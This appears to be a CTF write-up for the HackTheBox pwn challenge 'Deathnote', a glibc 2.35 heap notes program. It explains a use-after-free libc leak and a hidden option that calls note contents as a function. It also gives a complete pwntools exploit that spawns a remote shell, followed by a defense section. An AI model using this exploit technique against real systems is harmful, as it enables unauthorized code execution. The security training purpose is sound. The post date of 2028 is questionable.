---
layout: post
title: "Deathnote"
date: 2028-03-16 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, heap, use-after-free, glibc, tcache, unsorted-bin, libc-leak]
description: "A glibc 2.35 notes program with two composing flaws — a free that never nulls its slot, and a hidden menu option that turns a note into a function call. One unsorted-bin leak plus one arbitrary call is all it takes to skip past Full RELRO and PIE straight to a shell."
---

## Overview

Deathnote is a Medium pwn challenge: a menu-driven heap "notes" program built on glibc 2.35 with Full RELRO, stack canary, NX, and PIE all enabled. Two independent design faults compose into a clean shell — a [use-after-free](https://cwe.mitre.org/data/definitions/416.html) for the libc leak, and a hidden option that treats a note as a function pointer for arbitrary code execution.

## The technique

The `Remove entry` option frees a note but never clears the pointer in the notes array, so `Show entry` will still print freed memory — a use-after-free read. Separately, a hidden option `42` parses one note's *text* as a hex address and **calls it** with a second note as the argument. In glibc 2.35 the old `__malloc_hook`/`__free_hook` targets are gone, but this feature is a direct arbitrary call, so no hook or GOT overwrite is needed.

## Solution

### 1. Leak libc (tcache → unsorted bin)

The `0x90` tcache holds only 7 chunks. Allocate 9 notes of size `0x80` and free 8: the first 7 fill the tcache, and the 8th spills into the unsorted bin, whose `fd`/`bk` point into `main_arena`. UAF-show that chunk to leak it:

```python
libc.address = leak - 0x21ace0   # main_arena+96 for this glibc 2.35
system       = libc.sym['system']
```

### 2. Turn a note into a call

Re-create two notes (malloc hands back the freed tcache chunks):

- `note[0]` content = the ASCII hex string of `system` — so `strtoull` yields its address
- `note[1]` content = `"/bin/sh\x00"` — the argument

Then trigger option `42`:

```python
send_num(42)   # v = strtoull(note[0],16) == system ; call v(note[1]) == system("/bin/sh")
```

The full exploit — create `solve.py`:

```python
from pwn import *
libc = ELF('./glibc/libc.so.6', checksec=False)
p = remote(sys.argv[1], int(sys.argv[2]))
PROMPT = b'\xf0\x9f\x92\x80'
def send_num(n): p.sendlineafter(PROMPT, str(n).encode())
def add(i, s, d): send_num(1); send_num(s); send_num(i); p.sendafter(PROMPT, d)
def delete(i): send_num(2); send_num(i)
def show(i): send_num(3); send_num(i); p.recvuntil(b'Page content: '); return p.recvline()

for i in range(9): add(i, 0x80, b'A'*8)
for i in range(8): delete(i)
leak = u64(show(7).rstrip(b'\n').ljust(8, b'\x00'))
libc.address = leak - 0x21ace0
add(0, 0x80, f"{libc.sym['system']:x}".encode() + b'\x00')
add(1, 0x80, b'/bin/sh\x00')
send_num(42)
p.interactive()
```

A shell drops; `cat flag.txt` returns the flag.

```
HTB{...}
```

## Why it worked

Two independent faults compose: the free-without-nulling UAF hands you an infoleak with no extra bug, and the "note is a function pointer" option hands you a direct arbitrary call. Together they defeat Full RELRO and PIE without ever touching a GOT entry or a libc hook — the UAF is used only for the leak.

## Fix / defense

- Null the array slot on `free()` to kill the use-after-free, and never `printf("%s")` freed memory.
- Never interpret user-supplied data as a code or function pointer — option 42 is the entire vulnerability.
- Harden the allocator; the tcache/unsorted-bin leak depends on the program reading freed chunk metadata.
